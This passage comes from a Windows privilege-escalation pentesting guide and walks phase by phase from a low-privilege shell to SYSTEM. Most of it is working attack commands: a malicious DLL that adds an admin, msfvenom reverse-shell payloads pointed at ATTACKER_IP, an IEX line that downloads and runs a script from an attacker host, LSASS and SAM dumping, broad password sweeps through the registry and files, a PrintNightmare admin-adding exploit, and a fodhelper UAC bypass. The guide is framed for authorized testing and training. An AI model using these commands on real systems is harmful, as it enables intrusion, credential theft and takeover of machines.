C:\Program.exe
C:\Program Files\Vuln.exe
C:\Program Files\Vuln App\Sub.exe
C:\Program Files\Vuln App\Sub Dir\service.exe   (the real one, tried last)
```

**How to find it:**

```cmd
REM Services with spaces AND no quotes AND not in a system dir
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

```powershell
Get-ServiceUnquoted      # PowerUp
# or
Get-CimInstance Win32_Service | Where-Object { $_.PathName -match ' ' -and $_.PathName -notmatch '"' -and $_.PathName -notlike 'C:\Windows\*' } | Select Name, PathName
```

**Exploitation:**

```cmd
REM 1. Find a writable directory earlier in the path
accesschk.exe /accepteula -uwdq "C:\Program Files\Vuln App\"
icacls "C:\Program Files\Vuln App"

REM 2. Name your payload after the first unquoted segment and drop it there.
REM    For C:\Program Files\Vuln App\Sub Dir\service.exe and a writable "Vuln App":
copy C:\Windows\Temp\rev.exe "C:\Program Files\Vuln App\Sub.exe"

REM 3. Restart the service (or reboot)
sc stop <SERVICE> & sc start <SERVICE>
```

```powershell
Write-ServiceBinary -Name '<SERVICE>' -Path "C:\Program Files\Vuln App\Sub.exe"   # PowerUp helper
```

**Decision logic:** Unquoted path alone is not enough — you need **write access to one of the intermediate directories.** Check every segment. Most `C:\Program Files` subdirs are not writable by normal users; the win is usually a service installed to a custom top-level folder (`C:\MyApp\...`) with inherited loose ACLs.

### 4.5 DLL Hijacking

**The vulnerability:** A privileged process loads a DLL by name, and Windows searches a sequence of directories. If a **writable directory is searched before** the DLL's real location — or the DLL is simply missing — you plant a malicious DLL that gets loaded with the process's privileges.

**Windows DLL search order (safe mode default):**
1. The application's directory
2. `C:\Windows\System32`
3. `C:\Windows\System`
4. `C:\Windows`
5. Current working directory
6. Directories in the `PATH` environment variable

**How to find it:**

```powershell
Find-ProcessDLLHijack          # PowerUp
Find-PathDLLHijack             # checks writable PATH dirs
```

Use **Process Monitor** (procmon) on a test box, filtered for `Result: NAME NOT FOUND` and path ending `.dll`, to spot DLLs a privileged process looks for but fails to find — those are hijackable. Also check any **writable directory in `%PATH%`**:

```cmd
echo %PATH%
REM For each dir, test write access:
accesschk.exe /accepteula -uwdq "C:\Some\PathDir"
```

**Exploitation:**

```c
// Minimal malicious DLL — runs your command on load (DLL_PROCESS_ATTACH)
#include <windows.h>
BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID r){
  if (reason == DLL_PROCESS_ATTACH)
    system("cmd.exe /c net localgroup administrators youruser /add");
  return TRUE;
}
```

```bash
# Cross-compile from Linux (match target arch)
x86_64-w64-mingw32-gcc evil.c -shared -o hijackme.dll
# or generate with msfvenom:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f dll -o hijackme.dll
```

Drop the DLL with the exact expected name into the searched-first writable directory, then trigger the process (restart the service / wait for the scheduled run / reboot).

**Decision logic:** DLL hijacking needs (1) a privileged process that loads a non-system DLL, and (2) a writable directory earlier in its search order (or a writable `PATH` entry, or a missing DLL). Procmon is the reliable way to confirm; without it you're guessing. A writable directory in the system `PATH` is a strong, general finding — many processes become hijackable.

### 4.6 Weak Service Registry Permissions

**The vulnerability:** You can write to a service's registry key (`HKLM\SYSTEM\CurrentControlSet\Services\<SERVICE>`), letting you change `ImagePath` even if `sc config` is denied.

**How to find it:**

```cmd
accesschk.exe /accepteula -uvwqk "HKLM\System\CurrentControlSet\Services\<SERVICE>"
REM or via PowerShell Get-Acl on the key; look for your user/Users/Everyone with Write.
```

**Exploitation:**

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Services\<SERVICE>" /v ImagePath /t REG_EXPAND_SZ /d "C:\Windows\Temp\rev.exe" /f
sc stop <SERVICE> & sc start <SERVICE>
```

---

## Phase 5: Registry and AutoRuns

### 5.1 AlwaysInstallElevated

**The vulnerability:** Two policy keys are both set to `1`, allowing *any* user to install an MSI package with SYSTEM privileges. A frequent, trivial win.

**How to find it:**

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Both must return `0x1`. (PowerUp: `Get-RegistryAlwaysInstallElevated`; winPEAS flags it.)

**Exploitation:**

```bash
# Build a malicious MSI on your attack box
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f msi -o evil.msi
# or add an admin:
msfvenom -p windows/exec CMD="net localgroup administrators youruser /add" -f msi -o evil.msi
```

```cmd
REM On target: install quietly — runs as SYSTEM
msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
```

```powershell
Write-UserAddMSI    # PowerUp: generates and offers to run an MSI that adds an admin
```

**Decision logic:** Both keys `0x1` → near-guaranteed SYSTEM. Only one set → not exploitable. This is a top-of-list quick check.

### 5.2 Autorun Programs with Weak Permissions

**The vulnerability:** A program set to run at logon/boot (an autorun) points to a binary you can overwrite, or lives in a writable path. When a higher-privileged user logs in, your binary runs as them.

**How to find it:**

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
REM Also check the Startup folders:
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
dir "C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
```

Use Sysinternals **Autoruns** (`autorunsc.exe -a *`) for the complete picture. Then test each referenced binary:

```cmd
accesschk.exe /accepteula -quvw "C:\Path\To\autorun.exe"
```

**Exploitation:** Overwrite the writable autorun binary with your payload. It executes with the privileges of the next user to log in (ideally an admin). Requires a privileged logon to trigger — good on multi-user boxes, slow on single-user ones.

### 5.3 Startup Folder and Scheduled Logon Scripts

Check the all-users Startup folder's ACL — if a low-priv user can write there, dropping an executable means it runs when an admin logs in:

```cmd
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

---

## Phase 6: Credential Hunting

Admins leave passwords everywhere — in config files, the registry, scripts, histories, and memory. A recovered admin password or hash is often the cleanest privesc, and it frequently enables lateral movement too. Hunt systematically.

### 6.1 Unattended Install and Provisioning Files

These are left by automated deployments and often contain a base64-encoded local admin password.

```cmd
dir /s /b C:\unattend.xml C:\Windows\Panther\Unattend.xml C:\Windows\Panther\Unattend\Unattend.xml C:\Windows\System32\sysprep\sysprep.xml C:\Windows\System32\sysprep\unattend.xml 2>nul
type C:\Windows\Panther\Unattend.xml
```

Also look for: `Autounattend.xml`, `sysprep.inf`, `sysprep.xml`, `C:\Windows\Panther\Unattend\`. The password sits in `<Password><Value>...</Value></Password>` (base64; decode it). PowerUp: `Get-UnattendedInstallFile`.

### 6.2 Group Policy Preferences (GPP) — cPassword

If the box is domain-joined, cached Group Policy may include a GPP XML with an AES-encrypted password whose key Microsoft **published** — so it's trivially decryptable.

```cmd
REM Search local GPO cache and SYSVOL (if reachable)
dir /s /b C:\ProgramData\Microsoft\Group Policy\History\*.xml 2>nul
findstr /S /I cpassword \\<DOMAIN>\sysvol\<domain>\policies\*.xml
```

```bash
# Decrypt a found cpassword:
gpp-decrypt <cpassword_blob>
```

Files: `Groups.xml`, `Services.xml`, `ScheduledTasks.xml`, `Printers.xml`, `Drives.xml`, `DataSources.xml`.

### 6.3 Registry-Stored Credentials

```cmd
REM Windows autologon (plaintext password in the registry)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

REM VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password
reg query "HKLM\SOFTWARE\TightVNC\Server"

REM PuTTY saved sessions (proxy creds, etc.)
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

REM SNMP, and a broad sweep for "password" across the hive
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### 6.4 Saved Credentials, Credential Manager, and runas

```cmd
REM Stored Windows credentials you can reuse without knowing the password
cmdkey /list
REM If an admin cred is stored, run a command as them (no password needed):
runas /savecred /user:ADMINUSER "C:\Windows\Temp\rev.exe"
```

```powershell
# DPAPI-protected secrets: Credential Manager, browser logins, etc.
# Harvest with Mimikatz (dpapi::cred / dpapi::masterkey) or SharpDPAPI once you can decrypt masterkeys.
# Vault:
vaultcmd /list
vaultcmd /listcreds:"Windows Credentials" /all
```

### 6.5 Configuration Files and Scripts

```powershell
# Sweep for secrets in common config/script types
Get-ChildItem C:\ -Recurse -Include *.config,*.xml,*.ini,*.txt,*.ps1,*.bat,*.cmd,*.vbs,*.yml,*.yaml,*.json,*.php,*.aspx -ErrorAction SilentlyContinue |
  Select-String -Pattern "password|passwd|pwd|secret|connectionstring|apikey|api_key" -ErrorAction SilentlyContinue |
  Select Path, LineNumber, Line
```

```cmd
REM Classic broad grep across the drive
findstr /si password *.txt *.ini *.config *.xml *.config.* 2>nul
findstr /spin "password" C:\*.xml C:\*.ini C:\*.txt 2>nul
```

**High-value targets:** `web.config` (DB connection strings, app-pool creds), IIS `applicationHost.config`, `*.config` for .NET apps, `wp-config.php`, `.env` files, backup scripts with embedded creds, `C:\inetpub\wwwroot\` app configs.

### 6.6 PowerShell History and Transcripts

```powershell
# Per-user PSReadline history — admins paste passwords into one-liners constantly
type (Get-PSReadlineOption).HistorySavePath
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# Enumerate for all users:
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt | % { "`n== $_ =="; Get-Content $_ }
```

Also check PowerShell transcript logs and, if script-block logging is on, the `Microsoft-Windows-PowerShell/Operational` event log.

### 6.7 SAM / SYSTEM via Backups and VSS

Even without `SeBackupPrivilege`, old copies of the hives are often lying around:

```cmd
dir /s /b C:\Windows\Repair\SAM C:\Windows\System32\config\RegBack\SAM 2>nul
```

```powershell
# HiveNightmare / SeriousSAM (CVE-2021-36934): on vulnerable builds, non-admins can
# read SAM/SYSTEM/SECURITY via Volume Shadow Copies. Check readability:
icacls C:\Windows\System32\config\SAM
# If BUILTIN\Users has (R), copy from a shadow copy:
# \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
```

Then `impacket-secretsdump -sam SAM -system SYSTEM LOCAL` offline → local admin hash → Pass-the-Hash.

### 6.8 LSASS Memory

If you reach a medium/high-integrity context (or hold SeDebug), dump LSASS and parse it:

```cmd
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Windows\Temp\lsass.dmp full
```

```bash
# Offline, on the attack box (avoids touching mimikatz on target / AV)
pypykatz lsa minidump lsass.dmp
```

Yields plaintext passwords, NTLM hashes, and Kerberos tickets of logged-on users — frequently an admin. (Modern defenses: LSA Protection / Credential Guard may block this.)

### 6.9 Third-Party App Secrets

- **Browsers** — saved logins (SharpChrome/SharpDPAPI, LaZagne).
- **KeePass** (`.kdbx`), **password managers**, **FileZilla** (`recentservers.xml`, `sitemanager.xml`), **WinSCP** (`WinSCP.ini`/registry — reversible stored passwords).
- **mRemoteNG** (`confCons.xml` — weakly encrypted), **OpenVPN** `.ovpn` with inline creds.
- **One tool to sweep them all:**

```cmd
LaZagne.exe all           REM dumps creds from dozens of apps at once
```

### 6.10 Wi-Fi, Scheduled Tasks, and Command Lines

```cmd
REM Saved Wi-Fi passwords
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear

REM Passwords passed on command lines of running processes (visible to all users)
wmic process get CommandLine,Name | findstr /i "pass pwd cred key"
```

**Decision logic:** Run `LaZagne.exe all` and the config/history sweeps early — they're fast and high-yield. Any recovered password: (1) try it for the local Administrator and every other local user (`runas`, WinRM, RDP), (2) spray it across the domain if joined, (3) check password reuse. A hash instead of a password → Pass-the-Hash. Credential hunting often *is* the privesc, and it bridges directly into lateral movement.

---

## Phase 7: Scheduled Tasks

**The vulnerability:** A scheduled task runs as SYSTEM or an admin, and you can modify what it executes — the task's binary/script, or a file/folder it depends on with weak ACLs.

**How to find it:**

```cmd
schtasks /query /fo LIST /v
REM Narrow to tasks not run by your user and their actions:
schtasks /query /fo LIST /v | findstr /i "TaskName Run As User Task To Run"
```

```powershell
Get-ScheduledTask | ForEach-Object {
  [PSCustomObject]@{
    Name   = $_.TaskName
    RunAs  = $_.Principal.UserId
    Action = ($_.Actions | ForEach-Object { $_.Execute + ' ' + $_.Arguments })
  }
} | Where-Object { $_.RunAs -match 'SYSTEM|Admin' } | Format-Table -Auto
```

For each task running as SYSTEM/admin, find the executed file and test write access:

```cmd
icacls "C:\Scripts\backup.ps1"
accesschk.exe /accepteula -quvw "C:\Scripts\backup.ps1"
```

**Exploitation:** If you can write the script/binary the task runs, replace its contents with your payload (add an admin, or a reverse shell) and wait for (or trigger) the next run:

```cmd
REM If you can run it on demand:
schtasks /run /tn "\Path\To\TaskName"
```

**Decision logic:** A task that runs **frequently** as SYSTEM and whose target you can write is a reliable win — just wait for the interval. A task that runs rarely (daily/at logon) is slower; note it and keep enumerating. Also inspect **working directories and included files** — a task that `cd`s into a writable folder and runs a relative command, or imports a writable module, is exploitable even if the main script isn't writable.

---

## Phase 8: Kernel and Component Exploits

When misconfigurations run dry and the box is under-patched, a kernel or privileged-component exploit can jump you straight to SYSTEM. These are **higher risk** — a bad exploit can crash (BSOD) the machine. Use them when you've confirmed applicability, ideally after trying the safer vectors.

### 8.1 Identify Missing Patches

```bash
# From saved `systeminfo` output (offline, safest):
python3 wes.py systeminfo.txt --exploits-only -i "Elevation of Privilege" --severity critical
```

```powershell
# On target (.NET): checks for a curated set of privesc patches
.\Watson.exe
```

```
# Metasploit
meterpreter > run post/multi/recon/local_exploit_suggester
```

### 8.2 Notable Windows LPE Vulnerabilities

| CVE / Name | Affects | Notes |
|------------|---------|-------|
| **MS16-032** (Secondary Logon) | Win7–10, 2008–2012 | PowerShell PoC (`Invoke-MS16-032`); needs ≥2 CPU cores. Very reliable. |
| **MS16-135** | Win7–10, 2008–2016 | Win32k. |
| **MS15-051** (ClientCopyImage) | 2003–2012R2 | win32k.sys; classic, reliable compiled exploit. |
| **MS14-058 / MS14-068** | Older | 058 = win32k LPE; 068 = Kerberos (domain). |
| **MS10-015 (KiTrap0D)** | Win2000–2008, XP | Very old boxes. |
| **PrintNightmare (CVE-2021-1675 / 2021-34527)** | Broad (Spooler) | Local & remote; drops a DLL as SYSTEM via the print spooler. |
| **HiveNightmare / SeriousSAM (CVE-2021-36934)** | Win10/11 2004+ | Not a kernel exploit — read SAM via VSS (see 6.7). Safe, no crash risk. |
| **CVE-2021-1732 / CVE-2022-21882** | Win10/2019/2004+ | win32k LPE, used in the wild. |
| **CVE-2020-0787 (BITS)** | Win7–10, 2008–2019 | Arbitrary file move → SYSTEM. |
| **CVE-2020-1472 (Zerologon)** | DCs | Netlogon — domain compromise, not local LPE, but SYSTEM-equivalent on the DC. |
| **Spooler/Component CVEs (various)** | ongoing | Always check the current year's Patch-Tuesday LPEs for the exact build. |

**PrintNightmare (local privesc variant):**

```powershell
# If the Print Spooler is running and the box is unpatched:
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "pwned" -NewPassword "Pwned123!" -DriverName "evil"
# Adds a local admin via a malicious printer driver loaded by the SYSTEM spooler.
```

**MS16-032 (no-patch, common on older boxes):**

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-MS16-032.ps1')
Invoke-MS16-032      # spawns a SYSTEM process; variants let you run a custom command
```

**Decision logic:**
- Prefer **non-crashing** vectors first (HiveNightmare/SeriousSAM, PrintNightmare where stable, token abuse) over raw kernel exploits.
- **Match the exact OS build and architecture.** Firing an exploit built for the wrong build is the #1 cause of BSODs.
- On a **production** engagement, confirm the client accepts the stability risk before running kernel exploits; prefer a reboot-safe technique.
- Compile/test against a matching VM when possible. Keep a copy of the exact PoC and its requirements.

---

## Phase 9: UAC Bypass and Miscellaneous Vectors

### 9.1 UAC Bypass (you're already an admin, but at Medium integrity)

**When this applies:** `whoami /groups` shows you're in **Administrators**, but `whoami /priv` is sparse and you're at **Medium** integrity — classic for a phished admin user or a non-elevated RDP/WinRM session. You don't need a vulnerability; you need to *elevate* an existing admin to High integrity.

**Check your integrity level:**

```cmd
whoami /groups | findstr /i "Label"     REM Medium vs High Mandatory Level
```

**Common bypass techniques (auto-elevating binaries + hijacked registry/paths):**

```cmd
REM fodhelper.exe bypass (very common, Win10/11)
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Windows\Temp\rev.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f
fodhelper.exe
REM Clean up the keys afterward.
```

Other reliable ones: `computerdefaults.exe` (same ms-settings trick), `eventvwr.exe` (mscfile), `sdclt.exe`, `slui.exe`, DLL-based bypasses. The **UACME** project catalogs 70+ methods by number — pick one matching the OS build. Metasploit has `exploit/windows/local/bypassuac_*` modules.

**Decision logic:** If you're an admin at Medium integrity, UAC bypass is the "privesc" — fast and reliable. It's not applicable if your user isn't in Administrators; then you need a real vulnerability from the earlier phases.

### 9.2 Named Pipe Impersonation (manual potato)

When you control a SYSTEM service's execution but want a token rather than code-exec, create a named pipe, get a SYSTEM process to connect, and `ImpersonateNamedPipeClient`. This underlies the potato tools and Metasploit's `getsystem` technique 1.

### 9.3 Writable %PATH% and Binary Planting

If any directory in the **system** `%PATH%` is writable by you (checked in 4.5), you can plant a malicious copy of a commonly invoked binary or DLL that an admin/SYSTEM process calls without a full path. Also check for scripts (admin cron-like tasks, logon scripts) that call executables by bare name.

### 9.4 Insecure GUI Applications Running as Admin

A GUI app running elevated can be a pivot: use its File→Open dialog to launch `cmd.exe` (type `cmd.exe` in the path bar), its "Help" to spawn a browser then a shell, or any embedded shell-out. Applications pinned to run as admin on a kiosk/shared box are prime targets.

### 9.5 Stored Session Tokens / Tickets (domain context)

On a domain-joined box, after reaching local SYSTEM you can harvest Kerberos tickets and cached credentials for lateral movement — but even before SYSTEM, check for cached tickets, saved RDP creds (`cmdkey`), and `.rdp` files pointing to other hosts.

### 9.6 WSL, Docker, and Other Subsystems

- **WSL** — a running WSL instance may hold creds in bash history, and `wsl.exe` can sometimes be leveraged. Check `C:\Users\*\AppData\Local\Packages\*Linux*`.
- **Docker Desktop** — membership in `docker-users` can be abused to mount the host filesystem into a container as root → full host read/write.

---

## Phase 10: Post-SYSTEM — Confirm, Loot, and Persist

Once you have SYSTEM, your job on a real engagement isn't over — confirm, collect evidence, and document.

### 10.1 Confirm the Win

```cmd
whoami                    REM nt authority\system
whoami /priv              REM full privilege set
hostname & ipconfig
```

### 10.2 Dump Local Credentials

```cmd
REM Save hives and extract offline (cleanest)
reg save HKLM\SAM C:\Windows\Temp\sam.hive
reg save HKLM\SYSTEM C:\Windows\Temp\system.hive
reg save HKLM\SECURITY C:\Windows\Temp\security.hive
```

```bash
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL
```

Or, on target, Mimikatz: `privilege::debug` → `token::elevate` → `lsadump::sam` / `sekurlsa::logonpasswords`. On a Domain Controller, this is where you pivot to `lsadump::dcsync` or NTDS extraction for the whole domain (covered in the Active Directory guide).

### 10.3 Persistence (engagement-dependent, with authorization)

Only if your rules of engagement allow it, and clean up afterward. Options include: a new local admin account, a service/scheduled task, registry Run keys, or a backdoored binary. **Document every change** you make so it can be reverted.

### 10.4 Clean Up

Reverse your changes: restore original service configs/binaries, delete dropped files (`C:\Windows\Temp\*`), remove added accounts and registry keys, and note everything in the report. Leaving a box in a modified/weaker state is a finding against *you*.

---

## Quick Wins Checklist (run these first)

Before deep enumeration, these five checks catch a large share of boxes in minutes:

```cmd
REM 1. The privilege jackpot
whoami /priv

REM 2. AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul

REM 3. Stored credentials you can reuse
cmdkey /list

REM 4. Autologon / registry passwords
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword 2>nul

REM 5. Am I secretly already an admin (just need UAC bypass)?
whoami /groups | findstr /i "S-1-5-32-544"
```

- `SeImpersonate`/`SeAssignPrimaryToken` → **Potato** (Phase 3.1)
- Both AlwaysInstallElevated keys `0x1` → **malicious MSI** (Phase 5.1)
- `cmdkey` shows admin creds → **`runas /savecred`** (Phase 6.4)
- Autologon password present → **reuse it** (Phase 6.3)
- In Administrators at Medium integrity → **UAC bypass** (Phase 9.1)

---

## The Full Methodology Checklist

```
[ ] 0.  Stabilize shell; set up two-way file transfer; note AV/EDR
[ ] 1.  whoami /all  — privileges, groups, integrity level  (the #1 check)
[ ] 2.  systeminfo — OS build, arch, hotfixes → feed to wesng
[ ] 3.  Users, groups, sessions — who else, am I in a privileged group
[ ] 4.  Network — netstat for internal-only services (127.0.0.1)
[ ] 5.  Processes & installed software — third-party CVEs, what runs as SYSTEM
[ ] 6.  Quick wins: AlwaysInstallElevated, cmdkey, autologon reg
[ ] 7.  Run winPEAS / PowerUp / PrivescCheck — read all output
[ ] 8.  Token abuse: SeImpersonate→Potato, SeBackup, SeDebug, SeLoadDriver...
[ ] 9.  Services: unquoted paths, weak config perms, weak binary perms
[ ] 10. Services: DLL hijacking, weak registry perms, writable %PATH%
[ ] 11. Scheduled tasks — writable scripts/binaries run as SYSTEM
[ ] 12. Autoruns & Startup folder — writable autorun binaries
[ ] 13. Credential hunt: unattend, GPP, registry, configs, PS history
[ ] 14. Credential hunt: LaZagne all, SAM/SYSTEM backups & VSS, LSASS
[ ] 15. Reuse every found cred — local admin, runas, WinRM, domain spray
[ ] 16. Kernel/component exploits — only after matching build, accept risk
[ ] 17. UAC bypass if already an admin at Medium integrity
[ ] 18. Post-SYSTEM: confirm, dump SAM/LSASS, (authorized) persist
[ ] 19. Clean up all changes; document everything
[ ] 20. Report writing
```

---

## Decision Flowchart — "I have a shell, now what?"

```
whoami /priv
  ├─ SeImpersonate / SeAssignPrimaryToken? ───────────► Potato (3.1)      [fastest]
  ├─ SeBackup / Backup Operators? ────────────────────► Dump SAM (3.3)
  ├─ SeDebug? ────────────────────────────────────────► Dump LSASS (3.2)
  ├─ SeRestore / SeTakeOwnership / SeLoadDriver? ─────► Phase 3
  └─ Nothing special
        │
whoami /groups — in Administrators @ Medium? ──────────► UAC bypass (9.1)
        │ no
Quick wins: AlwaysInstallElevated / cmdkey / autologon ► instant win if present
        │ none
Run winPEAS/PowerUp ─► triage services / creds / tasks
        │
  ├─ Modifiable service / unquoted path / weak ACL? ──► Phase 4
  ├─ Credentials in files/registry/memory? ───────────► Phase 6 → reuse
  ├─ Writable scheduled task / autorun? ──────────────► Phase 7 / 5
  └─ Under-patched & nothing else? ───────────────────► Kernel exploit (8)
```

---

## Essential Tools Reference

| Tool | Purpose |
|------|---------|
| **winPEAS** (exe/bat/ps1) | All-in-one privesc enumeration |
| **PowerUp.ps1 / SharpUp** | Service & misconfig checks with auto-exploit helpers |
| **PrivescCheck.ps1** | Modern, low-noise enumeration |
| **Seatbelt** | Broad host triage (.NET) |
| **accesschk.exe** (Sysinternals) | Verify object permissions (services, files, registry) |
| **Autoruns / autorunsc** | Enumerate all autostart entries |
| **Process Monitor (procmon)** | Confirm DLL hijacks / file-access behavior |
| **PrintSpoofer / GodPotato / RoguePotato / JuicyPotato** | SeImpersonate → SYSTEM |
| **Mimikatz / pypykatz** | Credential extraction from SAM/LSASS |
| **LaZagne** | Multi-application credential recovery |
| **impacket-secretsdump** | Offline hash extraction from hives/NTDS |
| **wesng (wes.py)** | Missing-patch analysis from systeminfo |
| **Watson** | Modern .NET missing-patch checker |
| **UACME** | Catalogued UAC bypass techniques |
| **msfvenom / Metasploit** | Payloads, MSI/DLL generation, local_exploit_suggester |

---

## Recommended Practice Labs

| Lab | Focus | Platform |
|-----|-------|----------|
| **Windows PrivEsc (Steflan / TCM)** | Guided, covers every vector | TryHackMe |
| **Windows Privilege Escalation** | Core methodology | TryHackMe |
| **Alfred** | Jenkins → SeImpersonate token abuse | TryHackMe |
| **Steel Mountain** | Unquoted service / MS16-032 | TryHackMe |
| **Blue** | EternalBlue → SYSTEM (classic) | TryHackMe |
| **Access / Optimum / Devel** | Classic Windows privesc chains | Hack The Box |
| **Jeeves / Bastard / Grandpa / Granny** | Services, kernel, token abuse | Hack The Box |
| **Love / ServMon / Remote** | Service & credential-based privesc | Hack The Box |
| **Secnotes / Chatterbox** | Credential reuse, buffer-overflow-to-SYSTEM | Hack The Box |
| **PG Practice (Proving Grounds)** | Dozens of OSCP-style Windows privesc boxes | Offensive Security |

**Reference material worth bookmarking:** the Potato family READMes, the Juicy-Potato CLSID lists, `lolbas-project.github.io` (living-off-the-land binaries), `wadcoms.github.io`, HackTricks' Windows Local Privilege Escalation page, and the Sushant747 / PayloadsAllTheThings privesc notes.

---

## Closing Notes

Windows privilege escalation rewards **methodical enumeration over clever exploits.** The fastest wins — a `SeImpersonatePrivilege`, both `AlwaysInstallElevated` keys, a stored credential, an admin at Medium integrity — are found in the first five minutes if you look. The harder boxes give up their secrets to patient, complete enumeration: read every winPEAS line, check every service's ACL, hunt every config file.

Work the phases in order, verify automated findings by hand before committing time, and prefer deterministic vectors (tokens, misconfigs, credentials) over crash-prone kernel exploits. And on real engagements: document every change, clean up after yourself, and leave the box no weaker than you found it.

This pairs with the companion [Active Directory](/posts/active-directory-pentesting-guide/) and [Web Application](/posts/web-exploitation-pentesting-guide/) guides — local SYSTEM is frequently the stepping stone from a web foothold into full domain compromise.

---

*This guide is a living document. As new techniques emerge and tools evolve, it will be updated. All techniques should only be used in authorized testing environments.*
